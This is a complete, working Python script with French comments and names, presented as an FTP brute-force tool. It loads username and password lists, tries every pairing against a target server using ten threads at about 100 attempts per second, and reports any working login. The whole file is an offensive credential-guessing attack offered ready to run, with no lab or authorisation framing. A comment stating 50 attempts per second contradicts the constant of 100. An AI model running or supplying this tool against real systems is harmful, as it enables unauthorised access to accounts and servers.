import ftplib
import time
import sys
import threading
from queue import Queue

# Limitation à 50 tentatives par seconde
TENTATIVES_PAR_SECONDE = 100
DELAI = 1.0 / TENTATIVES_PAR_SECONDE

class FTPBruteForce:
    def __init__(self, serveur, utilisateurs, fichier_mots_de_passe):
        self.serveur = serveur
        self.utilisateurs = self._charger_utilisateurs(utilisateurs)
        self.mots_de_passe = self._charger_mots_de_passe(fichier_mots_de_passe)
        self.identifiants_trouves = None
        self.verrou = threading.Lock()
        self.file_attente = Queue()
        self.tentatives = 0
        self.en_cours = True

    def _charger_utilisateurs(self, utilisateurs):
        """Charge les utilisateurs depuis un fichier ou un seul utilisateur"""
        try:
            with open(utilisateurs, 'r') as f:
                return [ligne.strip() for ligne in f if ligne.strip()]
        except (IOError, OSError):
            return [utilisateurs]  # Supposer que c'est un seul nom d'utilisateur

    def _charger_mots_de_passe(self, fichier_mots_de_passe):
        """Charge les mots de passe depuis un fichier"""
        with open(fichier_mots_de_passe, 'r') as f:
            return [ligne.strip() for ligne in f if ligne.strip()]

    def _connexion_ftp(self, utilisateur, mot_de_passe):
        """Tente une connexion FTP avec les identifiants donnés"""
        try:
            ftp = ftplib.FTP(self.serveur)
            ftp.login(utilisateur, mot_de_passe)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception as e:
            print(f"Erreur de connexion: {e}")
            return False

    def _travailleur(self):
        """Thread travailleur pour tenter les identifiants"""
        while self.en_cours and not self.file_attente.empty():
            utilisateur, mot_de_passe = self.file_attente.get()
            
            debut = time.time()
            
            with self.verrou:
                self.tentatives += 1
                print(f"Tentative #{self.tentatives}: {utilisateur}:{mot_de_passe}")
            
            if self._connexion_ftp(utilisateur, mot_de_passe):
                with self.verrou:
                    self.identifiants_trouves = (utilisateur, mot_de_passe)
                    self.en_cours = False
                    print(f"\n[SUCCÈS] Identifiants trouvés: {utilisateur}:{mot_de_passe}")
                    return
            
            # Limitation du taux
            temps_ecoule = time.time() - debut
            if temps_ecoule < DELAI:
                time.sleep(DELAI - temps_ecoule)
            
            self.file_attente.task_done()

    def executer(self, nombre_threads=10):
        """Exécute l'attaque par brute force"""
        # Remplir la file avec toutes les combinaisons possibles
        for utilisateur in self.utilisateurs:
            for mot_de_passe in self.mots_de_passe:
                self.file_attente.put((utilisateur, mot_de_passe))
        
        # Démarrer les threads travailleurs
        threads = []
        for i in range(nombre_threads):
            t = threading.Thread(target=self._travailleur)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Attendre la fin ou le succès
        try:
            while self.en_cours and any(t.is_alive() for t in threads):
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[INFO] Interruption clavier reçue. Arrêt en cours...")
            self.en_cours = False
            for t in threads:
                t.join()
            sys.exit(0)
        
        if not self.identifiants_trouves:
            print("\n[ÉCHEC] Aucun identifiant valide trouvé dans le dictionnaire.")

def principal():
    if len(sys.argv) != 4:
        print("Utilisation: python ftp_brute.py <serveur> <utilisateur|fichier_utilisateurs> <fichier_mots_de_passe>")
        sys.exit(1)
    
    serveur = sys.argv[1]
    utilisateurs = sys.argv[2]
    fichier_mots_de_passe = sys.argv[3]
    
    print(f"""
    Outil de Brute Force FTP
    ------------------------
    Cible: {serveur}
    Utilisateurs: {utilisateurs}
    Fichier de mots de passe: {fichier_mots_de_passe}
    Taux de tentatives: {TENTATIVES_PAR_SECONDE}/seconde
    """)
    
    brute_force = FTPBruteForce(serveur, utilisateurs, fichier_mots_de_passe)
    brute_force.executer()

if __name__ == "__main__":
    principal()
